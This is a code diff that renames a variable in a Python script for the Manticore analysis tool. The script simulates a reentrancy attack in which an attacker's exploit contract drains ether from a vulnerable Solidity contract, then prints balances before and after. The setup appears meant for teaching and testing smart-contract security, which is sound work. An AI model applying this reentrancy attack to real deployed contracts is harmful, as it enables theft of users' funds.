@@ -1,8 +1,8 @@
 from manticore.seth import ManticoreEVM, ABI
 ################ Script #######################
 
-seth = ManticoreEVM()
-seth.verbosity(0)
+m = ManticoreEVM()
+m.verbosity(0)
 #The contract account to analyze
 contract_source_code = '''
 pragma solidity ^0.4.15;
@@ -80,13 +80,13 @@ contract GenericReentranceExploit {
 
 
 #Initialize user and contracts
-user_account = seth.create_account(balance=100000000000000000)
-attacker_account = seth.create_account(balance=100000000000000000)
+user_account = m.create_account(balance=100000000000000000)
+attacker_account = m.create_account(balance=100000000000000000)
 
-contract_account = seth.solidity_create_contract(contract_source_code, owner=user_account) #Not payable
-seth.world.set_balance(contract_account, 1000000000000000000)  #give it some ether
+contract_account = m.solidity_create_contract(contract_source_code, owner=user_account) #Not payable
+m.world.set_balance(contract_account, 1000000000000000000)  #give it some ether
 
-exploit_account = seth.solidity_create_contract(exploit_source_code, owner=attacker_account)
+exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker_account)
 
 print "[+] Setup the exploit"
 exploit_account.set_vulnerable_contract(contract_account)
@@ -101,10 +101,10 @@ exploit_account.set_reentry_attack_string(reentry_string)
 
 
 print "[+] Initial world state"
-print " attacker_account %x balance: %d"% (attacker_account, seth.get_balance(attacker_account))
-print " exploit_account %x balance: %d"%  (exploit_account, seth.get_balance(exploit_account))
-print " user_account %x balance: %d"%  (user_account, seth.get_balance(user_account))
-print " contract_account %x balance: %d"%  (contract_account, seth.get_balance(contract_account))
+print " attacker_account %x balance: %d"% (attacker_account, m.get_balance(attacker_account))
+print " exploit_account %x balance: %d"%  (exploit_account, m.get_balance(exploit_account))
+print " user_account %x balance: %d"%  (user_account, m.get_balance(user_account))
+print " contract_account %x balance: %d"%  (contract_account, m.get_balance(contract_account))
 
 
 #User deposits all in contract
@@ -121,10 +121,10 @@ exploit_account.proxycall(ABI.make_function_id('withdrawBalance()'))
 print "[+] Let attacker destroy the exploit andprofit" 
 exploit_account.get_money() 
 
-print " attacker_account %x balance: %d"% (attacker_account, seth.get_balance(attacker_account))
-print " user_account %x balance: %d"%  (user_account, seth.get_balance(user_account))
-print " contract_account %x balance: %d"%  (contract_account, seth.get_balance(contract_account))
+print " attacker_account %x balance: %d"% (attacker_account, m.get_balance(attacker_account))
+print " user_account %x balance: %d"%  (user_account, m.get_balance(user_account))
+print " contract_account %x balance: %d"%  (contract_account, m.get_balance(contract_account))
 
-seth.finalize()
-print "[+] Look for results in %s"% seth.workspace
+m.finalize()
+print "[+] Look for results in %s"% m.workspace
 
